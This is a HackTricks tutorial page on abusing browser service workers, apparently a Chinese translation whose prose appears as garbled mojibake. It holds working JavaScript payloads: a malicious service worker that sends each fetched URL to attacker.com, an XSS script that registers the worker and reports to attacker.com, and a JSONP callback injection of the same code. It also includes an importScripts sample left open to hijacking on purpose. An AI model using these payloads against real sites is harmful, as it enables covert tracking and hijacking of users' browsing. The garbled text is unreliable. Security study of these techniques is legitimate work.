# Abusing Service Workers



{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**æœåŠ¡å·¥ä½œè€…**æ˜¯ç”±æµè§ˆå™¨åœ¨åå°è¿è¡Œçš„è„šæœ¬ï¼Œä¸ä»»ä½•ç½‘é¡µåˆ†å¼€ï¼Œå¯ç”¨ä¸éœ€è¦ç½‘é¡µæˆ–ç”¨æˆ·äº¤äº’çš„åŠŸèƒ½ï¼Œä»è€Œå¢å¼º**ç¦»çº¿å’Œåå°å¤„ç†**èƒ½åŠ›ã€‚æœ‰å…³æœåŠ¡å·¥ä½œè€…çš„è¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨[è¿™é‡Œ](https://developers.google.com/web/fundamentals/primers/service-workers)æ‰¾åˆ°ã€‚é€šè¿‡åˆ©ç”¨è„†å¼±ç½‘é¡µåŸŸä¸­çš„æœåŠ¡å·¥ä½œè€…ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è€…ä¸è¯¥åŸŸå†…æ‰€æœ‰é¡µé¢çš„äº¤äº’ã€‚


### Checking for Existing Service Workers

å¯ä»¥åœ¨**å¼€å‘è€…å·¥å…·**çš„**åº”ç”¨ç¨‹åº**é€‰é¡¹å¡ä¸­çš„**æœåŠ¡å·¥ä½œè€…**éƒ¨åˆ†æ£€æŸ¥ç°æœ‰çš„æœåŠ¡å·¥ä½œè€…ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯è®¿é—®[chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)ä»¥è·å–æ›´è¯¦ç»†çš„è§†å›¾ã€‚

### Push Notifications

**æ¨é€é€šçŸ¥æƒé™**ç›´æ¥å½±å“**æœåŠ¡å·¥ä½œè€…**ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡çš„èƒ½åŠ›ï¼Œè€Œæ— éœ€ç›´æ¥ç”¨æˆ·äº¤äº’ã€‚å¦‚æœæƒé™è¢«æ‹’ç»ï¼Œåˆ™é™åˆ¶äº†æœåŠ¡å·¥ä½œè€…æ„æˆæŒç»­å¨èƒçš„æ½œåŠ›ã€‚ç›¸åï¼Œæˆäºˆæƒé™ä¼šå¢åŠ å®‰å…¨é£é™©ï¼Œå› ä¸ºè¿™ä½¿å¾—æ¥æ”¶å’Œæ‰§è¡Œæ½œåœ¨æ¼æ´æˆä¸ºå¯èƒ½ã€‚

## Attack Creating a Service Worker

ä¸ºäº†åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ‚¨éœ€è¦æ‰¾åˆ°ï¼š

* ä¸€ç§æ–¹æ³•æ¥**ä¸Šä¼ ä»»æ„ JS** æ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œä»¥åŠä¸€ä¸ª**XSS æ¥åŠ è½½ä¸Šä¼ çš„ JS æ–‡ä»¶çš„æœåŠ¡å·¥ä½œè€…**
* ä¸€ä¸ª**è„†å¼±çš„ JSONP è¯·æ±‚**ï¼Œæ‚¨å¯ä»¥**æ“çºµè¾“å‡ºï¼ˆä½¿ç”¨ä»»æ„ JS ä»£ç ï¼‰**ï¼Œä»¥åŠä¸€ä¸ª**XSS**æ¥**åŠ è½½å¸¦æœ‰æœ‰æ•ˆè´Ÿè½½çš„ JSONP**ï¼Œè¿™å°†**åŠ è½½æ¶æ„æœåŠ¡å·¥ä½œè€…**ã€‚

åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæˆ‘å°†å±•ç¤ºä¸€ä¸ªä»£ç æ¥**æ³¨å†Œä¸€ä¸ªæ–°çš„æœåŠ¡å·¥ä½œè€…**ï¼Œè¯¥æœåŠ¡å·¥ä½œè€…å°†ç›‘å¬`fetch`äº‹ä»¶ï¼Œå¹¶å°†**æ¯ä¸ªè·å–çš„ URL å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨**ï¼ˆè¿™æ˜¯æ‚¨éœ€è¦**ä¸Šä¼ **åˆ°**æœåŠ¡å™¨**æˆ–é€šè¿‡**è„†å¼±çš„ JSONP** å“åº”åŠ è½½çš„ä»£ç ï¼‰ï¼š
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
è¿™æ˜¯å°†**æ³¨å†Œå·¥ä½œè€…**çš„ä»£ç ï¼ˆæ‚¨åº”è¯¥èƒ½å¤Ÿé€šè¿‡åˆ©ç”¨**XSS**æ‰§è¡Œçš„ä»£ç ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†å‘**æ”»å‡»è€…**çš„æœåŠ¡å™¨å‘é€**GET**è¯·æ±‚ï¼Œ**é€šçŸ¥**æœåŠ¡å·¥ä½œè€…çš„**æ³¨å†Œ**æ˜¯å¦æˆåŠŸï¼š
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
åœ¨æ»¥ç”¨æ˜“å—æ”»å‡»çš„ JSONP ç«¯ç‚¹æ—¶ï¼Œæ‚¨åº”è¯¥å°†å€¼æ”¾å…¥ `var sw` ä¸­ã€‚ä¾‹å¦‚ï¼š
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
æœ‰ä¸€ä¸ªä¸“é—¨ç”¨äº**æœåŠ¡å·¥ä½œè€…åˆ©ç”¨**çš„**C2**ï¼Œå«åš[**Shadow Workers**](https://shadow-workers.github.io)ï¼Œè¿™å°†å¯¹åˆ©ç”¨è¿™äº›æ¼æ´éå¸¸æœ‰ç”¨ã€‚

**24å°æ—¶ç¼“å­˜æŒ‡ä»¤**é™åˆ¶äº†æ¶æ„æˆ–è¢«æ”»é™·çš„**æœåŠ¡å·¥ä½œè€… (SW)**çš„ç”Ÿå‘½å‘¨æœŸï¼Œæœ€å¤šä¸ºXSSæ¼æ´ä¿®å¤åçš„24å°æ—¶ï¼Œå‡è®¾åœ¨çº¿å®¢æˆ·ç«¯çŠ¶æ€ã€‚ä¸ºäº†æœ€å°åŒ–æ¼æ´ï¼Œç½‘ç«™è¿è¥å•†å¯ä»¥é™ä½SWè„šæœ¬çš„ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰ã€‚å¼€å‘è€…è¿˜è¢«å»ºè®®åˆ›å»ºä¸€ä¸ª[**æœåŠ¡å·¥ä½œè€…æ€å¼€å…³**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)ä»¥ä¾¿å¿«é€Ÿåœç”¨ã€‚

## é€šè¿‡DOMè¦†ç›–åœ¨SWä¸­æ»¥ç”¨`importScripts`

ä»æœåŠ¡å·¥ä½œè€…è°ƒç”¨çš„å‡½æ•°**`importScripts`**å¯ä»¥**ä»ä¸åŒåŸŸå¯¼å…¥è„šæœ¬**ã€‚å¦‚æœä½¿ç”¨**æ”»å‡»è€…å¯ä»¥ä¿®æ”¹çš„å‚æ•°**è°ƒç”¨æ­¤å‡½æ•°ï¼Œä»–å°†èƒ½å¤Ÿ**ä»ä»–çš„åŸŸå¯¼å…¥JSè„šæœ¬**å¹¶è·å¾—XSSã€‚

**è¿™ç”šè‡³å¯ä»¥ç»•è¿‡CSPä¿æŠ¤ã€‚**

**ç¤ºä¾‹æ˜“å—æ”»å‡»çš„ä»£ç ï¼š**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### ä½¿ç”¨ DOM Clobbering

æœ‰å…³ DOM Clobbering çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

å¦‚æœ SW ç”¨äºè°ƒç”¨ **`importScripts`** çš„ URL/åŸŸå **åœ¨ä¸€ä¸ª HTML å…ƒç´ å†…**ï¼Œåˆ™ **å¯ä»¥é€šè¿‡ DOM Clobbering ä¿®æ”¹å®ƒ**ï¼Œä½¿ SW **ä»æ‚¨è‡ªå·±çš„åŸŸåŠ è½½è„šæœ¬**ã€‚

æœ‰å…³æ­¤çš„ç¤ºä¾‹ï¼Œè¯·æŸ¥çœ‹å‚è€ƒé“¾æ¥ã€‚

## å‚è€ƒ

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
